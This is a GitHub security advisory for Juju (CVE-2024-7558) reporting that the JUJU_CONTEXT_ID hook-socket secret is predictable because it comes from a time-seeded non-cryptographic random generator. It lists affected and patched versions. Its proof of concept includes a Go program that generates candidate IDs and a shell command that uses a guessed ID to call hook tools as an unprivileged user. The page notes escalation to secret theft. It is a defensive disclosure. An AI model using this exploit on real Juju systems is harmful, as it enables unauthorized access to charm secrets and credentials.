=== Content from github.com_871cf5cc_20250110_164634.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjuju%2Fjuju%2Fsecurity%2Fadvisories%2FGHSA-mh98-763h-m9v4)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjuju%2Fjuju%2Fsecurity%2Fadvisories%2FGHSA-mh98-763h-m9v4)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=juju%2Fjuju)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[juju](/juju)
/
**[juju](/juju/juju)**
Public

* [Notifications](/login?return_to=%2Fjuju%2Fjuju) You must be signed in to change notification settings
* [Fork
  508](/login?return_to=%2Fjuju%2Fjuju)
* [Star
   2.4k](/login?return_to=%2Fjuju%2Fjuju)

* [Code](/juju/juju)
* [Issues
  4](/juju/juju/issues)
* [Pull requests
  31](/juju/juju/pulls)
* [Actions](/juju/juju/actions)
* [Security](/juju/juju/security)
* [Insights](/juju/juju/pulse)

Additional navigation options

* [Code](/juju/juju)
* [Issues](/juju/juju/issues)
* [Pull requests](/juju/juju/pulls)
* [Actions](/juju/juju/actions)
* [Security](/juju/juju/security)
* [Insights](/juju/juju/pulse)

# JUJU\_CONTEXT\_ID is a predictable authentication secret

High

[hpidcock](/hpidcock)
published
GHSA-mh98-763h-m9v4
Oct 2, 2024

## Package

No package listed

## Affected versions

<= 3.5.3, <= 3.4.5, <= 3.3.6, <= 3.2.4, <= 3.1.9, <= 2.9.50

## Patched versions

3.5.4, 3.4.6, 3.3.7, 3.1.10, 2.9.51

## Description

`JUJU_CONTEXT_ID` is the authentication measure on the unit hook tool abstract domain socket. It looks like `JUJU_CONTEXT_ID=appname/0-update-status-6073989428498739633`.

This value looks fairly unpredictable, but due to the random source used, it is highly predictable.

`JUJU_CONTEXT_ID` has the following components:

* the application name
* the unit number
* the hook being currently run
* a uint63 decimal number

On a system the application name and unit number can be deduced by reading the structure of the filesystem.

The current hook being run is not easily deduce-able, but is a limited set of possible values, so one could try them all.

Finally the random number, this is generated from a non cryptographically secure random source. Specifically the random number generator built into the go standard library, using the current unix time in seconds (at startup) as the seed.

There is no rate limiting on the abstract domain socket, the only limiting factor is time (window of time the hook is run) and memory (how much memory is available to facilitate all the connections).

### Impact

On a juju machine (non-kubernetes) or juju charm container (on kubernetes), an unprivileged user in the same network namespace can connect to an abstract domain socket and guess the JUJU\_CONTEXT\_ID value. This gives the unprivileged user access to the same information and tools as the juju charm. This information could be secrets that give broader access.

### Patches

Patch: [ecd7e2d](https://github.com/juju/juju/commit/ecd7e2d0e9867576b9da04871e22232f06fa0cc7)

Patched in:

* 3.5.4
* 3.4.6
* 3.3.7
* 3.1.10
* 2.9.51

### Workarounds

No workaround. Upgrade will be required.

### References

[juju/worker/uniter/runner/context/contextfactory.go](https://github.com/juju/juju/blob/a5b7876263365977bd3e583f5325facdae73fbe4/worker/uniter/runner/context/contextfactory.go#L152)

Line 152
in
[a5b7876](/juju/juju/commit/a5b7876263365977bd3e583f5325facdae73fbe4)

|  | rand: rand.New(rand.NewSource(time.Now().Unix())), |
| --- | --- |

[juju/worker/uniter/runner/context/contextfactory.go](https://github.com/juju/juju/blob/a5b7876263365977bd3e583f5325facdae73fbe4/worker/uniter/runner/context/contextfactory.go#L164)

Line 164
in
[a5b7876](/juju/juju/commit/a5b7876263365977bd3e583f5325facdae73fbe4)

|  | return fmt.Sprintf("%s-%s-%d", f.unit.Name(), name, f.rand.Int63()) |
| --- | --- |

### PoC

With a contrived example, a charm that sleeps indefinitely on its first hook, install. This charm is called sleepy.

```
.
|-- hooks
|   `-- install
#!/bin/sh
sleep 10000
|-- manifest.yaml
bases:
  - name: ubuntu
    channel: 22.04/stable
    architectures:
      - amd64
|-- metadata.yaml
name: sleepy
summary: a sleepy charm
description: a sleepy charm that sleeps on install
`-- revision
1

```

With sleepy deployed into a model, we have a unit with the name `sleepy/0` and an tag of `unit-sleepy-0`.

With access to the log file we can very quickly get the start time of the unit:

```
ubuntu@juju-5e40c0-0:~$ cat /var/log/juju/unit-sleepy-0.log | grep 'unit "sleepy/0" started'
2024-08-06 05:10:07 INFO juju.worker.uniter uniter.go:363 unit "sleepy/0" started

```

If we don't have access to the log, we could get pretty close by trying every second between when log file was created and now:

```
nobody@juju-5e40c0-0:/var/log/juju$ cat unit-sleepy-0.log
cat: unit-sleepy-0.log: Permission denied
nobody@juju-5e40c0-0:/var/log/juju$ stat unit-sleepy-0.log
  File: unit-sleepy-0.log
  Size: 1403      	Blocks: 8          IO Block: 4096   regular file
Device: 10302h/66306d	Inode: 25967076    Links: 1
Access: (0640/-rw-r-----)  Uid: (  104/  syslog)   Gid: (    4/     adm)
Access: 2024-08-06 05:10:48.686975042 +0000
Modify: 2024-08-06 05:10:07.159133215 +0000
Change: 2024-08-06 05:10:07.159133215 +0000
 Birth: 2024-08-06 05:10:06.965129276 +0000

```

We can then pass that into this program:

```
package main

import (
	"flag"
	"fmt"
	"math/rand"
	"time"
)

func main() {
	var unitName string
	var unitStartLogTime string
	var currentHook string
	flag.StringVar(&unitName, "u", "sleepy/0", "")
	flag.StringVar(&unitStartLogTime, "t", "2024-08-06 05:10:07", "time when the last 'INFO juju.worker.uniter uniter.go:363 unit %q started' log was written to /var/log/juju/unit-name-0.log")
	flag.StringVar(&currentHook, "h", "install", "the current hook that is running right now")
	flag.Parse()

	t, err := time.Parse("2006-01-02 15:04:05", unitStartLogTime)
	if err != nil {
		panic(err)
	}

	sources := []rand.Source{
		rand.NewSource(t.Unix()),
		rand.NewSource(t.Unix() - 1),
		rand.NewSource(t.Unix() - 2),
	}

	for i := 0; i < 10; i++ {
		for _, source := range sources {
			fmt.Printf("%s-%s-%d\n", unitName, currentHook, source.Int63())
		}
	}
}

```

This program will give us a list of `JUJU_CONTEXT_ID`s to try. We just need to try each one. In this case it was the first one, because we had enough information.

```
$ go run . -u sleepy/0 -t "2024-08-06 05:10:07" -h install
sleepy/0-install-7349430268617352851
sleepy/0-install-2171542415131519293
sleepy/0-install-6564961386023494624
sleepy/0-install-59904244413115609
sleepy/0-install-6073989428498739633
sleepy/0-install-2504995199508561544
sleepy/0-install-1526670560532335303
sleepy/0-install-2568216045630615950
sleepy/0-install-8047402353801897930

```

Unfortunately, this worked too well.

```
nobody@juju-5e40c0-0:/var/log/juju$ JUJU_AGENT_SOCKET_NETWORK=unix JUJU_AGENT_SOCKET_ADDRESS=@/var/lib/juju/agents/unit-sleepy-0/agent.socket JUJU_CONTEXT_ID=sleepy/0-install-7349430268617352851 /var/lib/juju/tools/unit-sleepy-0/is-leader
True

```

With a more sophisticated attack, this could discover all the units on the machine, using the update-status hook, try a few thousand attempts per second to guess the start time and the current offset in the random source, then using secret-get hook tool, get some sort of secret, such as credentials to a system.

### Severity

High

8.7

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Local

Attack complexity
Low

Privileges required
Low

User interaction
None

Scope
Changed

Confidentiality
Low

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:L/I:H/A:H

### CVE ID

CVE-2024-7558

### Weaknesses

[CWE-337](/advisories?query=cwe%3A337) [CWE-340](/advisories?query=cwe%3A340) [CWE-1391](/advisories?query=cwe%3A1391)

### Credits

* [![@hpidcock](https://avatars.githubusercontent.com/u/4424127?s=40&v=4)](/hpidcock)
  [hpidcock](/hpidcock)
  Finder
* [![@lucistanescu](https://avatars.githubusercontent.com/u/17014534?s=40&v=4)](/lucistanescu)
  [lucistanescu](/lucistanescu)
  Coordinator

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


